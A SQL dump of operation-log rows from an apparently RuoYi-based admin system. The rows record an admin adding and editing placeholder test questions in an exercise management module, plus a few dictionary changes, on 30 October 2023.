INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (223, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdasdas\",\"choiceA\":\"dasdasd\",\"choiceB\":\"dasd\",\"choiceC\":\"asdasdas\",\"choiceD\":\"asdasd\",\"correctAnswer\":\"D\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 10:33:00\",\"exerciseTitle\":\"<p>asdasdasdasdasdas</p>\",\"exerciseType\":0,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 10:33:43\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 10:33:43', 35);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (224, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"全部\",\"dictSort\":0,\"dictType\":\"sys_exercise_cate\",\"dictValue\":\"12\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 11:07:56', 80);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (225, '字典类型', 3, 'com.ruoyi.project.system.controller.SysDictDataController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dict/data/105', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 11:15:32', 81);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (226, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12345\",\"choiceA\":\"1111\",\"choiceB\":\"444\",\"choiceC\":\"222\",\"choiceD\":\"33\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 14:39:09\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":0,\"id\":2,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 14:39:09', 53);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (227, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 14:42:14\",\"exerciseTitle\":\"<p>asdhhhh</p>\",\"exerciseType\":0,\"id\":3,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 14:43:11', 56897);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (228, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 14:45:16\",\"exerciseTitle\":\"<p>测试\\t</p>\",\"exerciseType\":0,\"id\":4,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":4}', 0, NULL, '2023-10-30 14:45:16', 48);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (229, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":5,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":5}', 0, NULL, '2023-10-30 15:01:42', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (230, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:02:40\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":6,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":6}', 0, NULL, '2023-10-30 15:02:40', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (231, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:04:03\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":7,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":7}', 0, NULL, '2023-10-30 15:04:03', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (232, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:10:46\",\"exerciseProgram\":\"\",\"id\":8,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":8}', 0, NULL, '2023-10-30 15:10:46', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (233, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:20:47\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":9,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":9}', 0, NULL, '2023-10-30 15:20:47', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (234, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:23:14\",\"exerciseProgram\":\"<p>hahahhaaa</p>\",\"id\":10,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":10}', 0, NULL, '2023-10-30 15:23:14', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (235, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:24:13\",\"exerciseProgram\":\"<p>hahahhaaaasdasda</p>\",\"id\":11,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":11}', 0, NULL, '2023-10-30 15:24:13', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (236, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:27:35\",\"exerciseProgram\":\"<p>123这是测试</p>\",\"id\":12,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":12}', 0, NULL, '2023-10-30 15:27:35', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (237, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>123这是测试hhh</p>\",\"id\":12,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 15:27:45\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 15:27:45', 37);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (238, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>123这是测试hhh12321312</p>\",\"id\":12,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 15:27:53\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 15:27:53', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (239, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:28:06\",\"exerciseProgram\":\"<p>a123123aazxczxcas</p>\",\"id\":13,\"params\":{},\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":13}', 0, NULL, '2023-10-30 15:28:07', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (240, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:30:40\",\"exerciseProgram\":\"<p>asdasdasd</p>\",\"id\":14,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":14}', 0, NULL, '2023-10-30 15:30:40', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (241, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asdasdasd</p>\",\"id\":14,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 15:34:10\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 15:34:10', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (242, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:38:58\",\"exerciseProgram\":\"<p>12312321</p>\",\"id\":15,\"params\":{},\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":15}', 0, NULL, '2023-10-30 15:38:58', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (243, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:47:57\",\"exerciseProgram\":\"<p>1231231</p>\",\"id\":16,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":16}', 0, NULL, '2023-10-30 15:47:57', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (244, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:49:25\",\"exerciseProgram\":\"<p>sadasdasd</p>\",\"id\":17,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":17}', 0, NULL, '2023-10-30 15:49:25', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (245, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:53:56\",\"exerciseProgram\":\"<p>asdasdasdas</p>\",\"id\":18,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":18}', 0, NULL, '2023-10-30 15:53:57', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (246, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:58:27\",\"exerciseProgram\":\"<p>asdasdas</p>\",\"id\":19,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":19}', 0, NULL, '2023-10-30 15:58:27', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (247, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:59:04\",\"exerciseProgram\":\"<p>123</p>\",\"id\":20,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":20}', 0, NULL, '2023-10-30 15:59:04', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (248, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:09:30\",\"exerciseProgram\":\"<p>213123</p>\",\"id\":21,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":21}', 0, NULL, '2023-10-30 16:09:30', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (249, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:11:54\",\"exerciseProgram\":\"<p>asdasda</p>\",\"id\":22,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":22}', 0, NULL, '2023-10-30 16:11:54', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (250, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:13:35\",\"exerciseProgram\":\"<p>asdasd</p>\",\"id\":23,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":23}', 0, NULL, '2023-10-30 16:13:35', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (251, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:14:27\",\"exerciseProgram\":\"<p>asdas</p>\",\"id\":24,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":24}', 0, NULL, '2023-10-30 16:14:27', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (252, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:15:19\",\"exerciseProgram\":\"<p>asdd</p>\",\"id\":25,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":25}', 0, NULL, '2023-10-30 16:15:19', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (253, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:15:34\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":26,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":26}', 0, NULL, '2023-10-30 16:15:34', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (254, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"1\",\"choiceB\":\"1\",\"choiceC\":\"1\",\"choiceD\":\"1\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:23:18\",\"exerciseType\":0,\"id\":27,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":27}', 0, NULL, '2023-10-30 16:23:18', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (255, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"213\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:23:30\",\"exerciseTitle\":\"<p>asdasd312312</p>\",\"exerciseType\":0,\"id\":28,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":28}', 0, NULL, '2023-10-30 16:23:30', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (256, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123123\",\"choiceA\":\"12123\",\"choiceB\":\"123\",\"choiceC\":\"3213\",\"choiceD\":\"123\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:23:38\",\"exerciseTitle\":\"<p>asdasd31231212312312</p>\",\"exerciseType\":0,\"id\":29,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":29}', 0, NULL, '2023-10-30 16:23:38', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (257, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"1\",\"choiceB\":\"321\",\"choiceC\":\"1\",\"choiceD\":\"123\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:23:46\",\"exerciseTitle\":\"<p>asdasd312312123123121111</p>\",\"exerciseType\":0,\"id\":30,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":30}', 0, NULL, '2023-10-30 16:23:46', 11);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (258, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:23:55\",\"exerciseTitle\":\"<p>asdasd312312123123121111123123</p>\",\"exerciseType\":0,\"id\":31,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":31}', 0, NULL, '2023-10-30 16:23:56', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (259, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:24:02\",\"exerciseTitle\":\"<p>asdasd31231212312312111112312312312312</p>\",\"exerciseType\":0,\"id\":32,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":32}', 0, NULL, '2023-10-30 16:24:02', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (260, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"3\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"12321\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:24:11\",\"exerciseTitle\":\"<p>asdasd312312123123121111123123123123121231232</p>\",\"exerciseType\":0,\"id\":33,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":33}', 0, NULL, '2023-10-30 16:24:11', 37);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (261, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 16:26:58\",\"exerciseProgram\":\"<p>12312</p>\",\"id\":34,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":34}', 0, NULL, '2023-10-30 16:26:58', 55);
